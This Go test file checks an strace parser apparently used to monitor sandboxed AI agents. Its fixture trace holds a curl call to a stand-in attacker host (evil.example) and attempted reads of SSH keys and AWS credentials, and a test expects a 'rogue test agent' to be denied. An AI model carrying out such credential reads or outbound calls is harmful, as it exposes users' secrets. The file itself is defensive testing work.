package events

import (
	"os"
	"strings"
	"testing"
)

const trace = `100 1731650000.000100 openat(AT_FDCWD</work>, "src/a.py", O_RDONLY|O_CLOEXEC) = 3</work/src/a.py>
100 1731650000.000200 openat(AT_FDCWD</work>, "/home/agent/.ssh/id_ed25519", O_RDONLY) = -1 EACCES (Permission denied)
100 1731650000.000300 openat(AT_FDCWD</work>, "out.txt", O_WRONLY|O_CREAT|O_TRUNC, 0644) = 4</work/out.txt>
100 1731650000.000400 openat(AT_FDCWD</work>, "missing.cfg", O_RDONLY) = -1 ENOENT (No such file or directory)
100 1731650000.000500 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xffff8f) = 101
101 1731650000.000600 chdir("tests") = 0
101 1731650000.000700 openat(AT_FDCWD, "conf.py", O_RDONLY <unfinished ...>
100 1731650000.000750 execve("/usr/bin/curl", ["curl", "-s", "https://evil.example/x?k=1"], 0xfffff /* 12 vars */) = 0
101 1731650000.000800 <... openat resumed>) = -1 ENOENT (No such file or directory)
100 1731650000.000900 connect(5<socket:[123]>, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr("93.184.216.34")}, 16) = -1 ENETUNREACH (Network is unreachable)
100 1731650000.001000 connect(6<socket:[124]>, {sa_family=AF_UNIX, sun_path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
100 1731650000.001100 renameat2(AT_FDCWD</work>, "a.tmp", AT_FDCWD</work>, "a.py", RENAME_NOREPLACE) = 0
100 1731650000.001200 unlinkat(AT_FDCWD</work>, "old.py", 0) = 0
100 1731650000.001300 execve("/usr/local/sbin/git", ["git"], 0xfff /* 3 vars */) = -1 ENOENT (No such file or directory)
100 1731650000.001400 openat(AT_FDCWD</work>, "q\"uote\\d.txt", O_RDONLY) = -1 ENOENT (No such file or directory)
100 1731650000.001500 connect(7<socket:[125]>, {sa_family=AF_INET, sin_port=htons(3128), sin_addr=inet_addr("172.20.0.2")}, 16) = -1 EINPROGRESS (Operation now in progress)
100 1731650000.001550 openat(AT_FDCWD</work>, "/proc/self/fd/5", O_RDONLY) = 9<pipe:[28668]>
100 1731650000.001600 +++ exited with 0 +++
`

func parse(t *testing.T) []Event {
	t.Helper()
	evs, err := ParseStrace(strings.NewReader(trace), "/work")
	if err != nil {
		t.Fatal(err)
	}
	return evs
}

func find(evs []Event, op Op, path string) *Event {
	for i := range evs {
		if evs[i].Op == op && (evs[i].Path == path || evs[i].Host == path) {
			return &evs[i]
		}
	}
	return nil
}

func TestReadsWritesAndDenials(t *testing.T) {
	evs := parse(t)
	if e := find(evs, OpRead, "/work/src/a.py"); e == nil || e.Result != OK {
		t.Fatalf("relative read should resolve via the fd path: %+v", e)
	}
	if e := find(evs, OpRead, "/home/agent/.ssh/id_ed25519"); e == nil || e.Result != Denied || e.Errno != "EACCES" {
		t.Fatalf("EACCES must be recorded as denied: %+v", e)
	}
	if e := find(evs, OpWrite, "/work/out.txt"); e == nil {
		t.Fatal("O_WRONLY|O_CREAT must be a write")
	}
	if e := find(evs, OpRead, "/work/missing.cfg"); e == nil || e.Result != Failed {
		t.Fatalf("ENOENT is an ordinary failure, not a denial: %+v", e)
	}
}

func TestCwdTrackingAndResumedCalls(t *testing.T) {
	evs := parse(t)
	// pid 101 inherited /work from 100, then chdir'd to tests; its openat was
	// split across an unfinished/resumed pair.
	if e := find(evs, OpRead, "/work/tests/conf.py"); e == nil || e.PID != 101 {
		t.Fatalf("child cwd and resumed call not handled: %+v", evs)
	}
}

func TestExecAndNetwork(t *testing.T) {
	evs := parse(t)
	e := find(evs, OpExec, "/usr/bin/curl")
	if e == nil || len(e.Argv) != 3 || e.Argv[2] != "https://evil.example/x?k=1" {
		t.Fatalf("execve argv not parsed: %+v", e)
	}
	if find(evs, OpExec, "/usr/local/sbin/git") != nil {
		t.Fatal("ENOENT execve from PATH search should be dropped")
	}
	c := find(evs, OpConnect, "93.184.216.34")
	if c == nil || c.Port != 443 || c.Result != Denied {
		t.Fatalf("blocked connect not recorded: %+v", c)
	}
	if p := find(evs, OpConnect, "172.20.0.2"); p == nil || p.Result != OK {
		t.Fatalf("EINPROGRESS is a connect under way, not a failure: %+v", p)
	}
	for _, ev := range evs {
		if ev.Op == OpConnect && ev.Host == "" {
			t.Fatal("unix socket connects must be skipped")
		}
		if strings.HasPrefix(ev.Path, "pipe:") {
			t.Fatal("pipes are not files")
		}
	}
}

func TestRenameDeleteAndEscapes(t *testing.T) {
	evs := parse(t)
	r := find(evs, OpRename, "/work/a.tmp")
	if r == nil || r.Path2 != "/work/a.py" {
		t.Fatalf("renameat2 not parsed: %+v", r)
	}
	if find(evs, OpDelete, "/work/old.py") == nil {
		t.Fatal("unlinkat not parsed")
	}
	if find(evs, OpRead, `/work/q"uote\d.txt`) == nil {
		t.Fatal("escaped quote and backslash not decoded")
	}
}

func TestSplitArgsKeepsNesting(t *testing.T) {
	got := splitArgs(`5<socket:[1,2]>, {sa_family=AF_INET, sin_port=htons(443)}, 16`)
	if len(got) != 3 {
		t.Fatalf("got %d args: %q", len(got), got)
	}
}

// TestRealTrace parses strace output captured from the rogue test agent under
// an enforce policy (Landlock on, private network), so the parser is checked
// against what strace 6.1 actually prints, not only hand-written lines.
func TestRealTrace(t *testing.T) {
	f, err := os.Open("testdata/rogue_enforce.trace")
	if err != nil {
		t.Skip("no captured trace")
	}
	defer f.Close()
	evs, err := ParseStrace(f, "/work")
	if err != nil {
		t.Fatal(err)
	}
	want := map[string]Result{
		"/home/agent/.ssh/id_ed25519":  Denied,
		"/home/agent/.aws/credentials": Denied,
		"/home/agent/.bashrc":          Denied,
		"/blast/out/trace.log":         Denied,
		"/work/notes.txt":              OK,
	}
	for p, r := range want {
		found := false
		for _, e := range evs {
			if e.Path == p && (e.Op == OpRead || e.Op == OpWrite) {
				found = true
				if e.Result != r {
					t.Errorf("%s: result %s, want %s", p, e.Result, r)
				}
			}
		}
		if !found {
			t.Errorf("%s: no event parsed", p)
		}
	}
	var blockedNet, execs int
	for _, e := range evs {
		if e.Op == OpConnect && e.Port == 443 && e.Result == Denied {
			blockedNet++
		}
		if e.Op == OpExec {
			execs++
		}
	}
	if blockedNet == 0 {
		t.Error("expected a denied connect to port 443")
	}
	if execs < 5 {
		t.Errorf("expected the rogue script's programs as exec events, got %d", execs)
	}
}
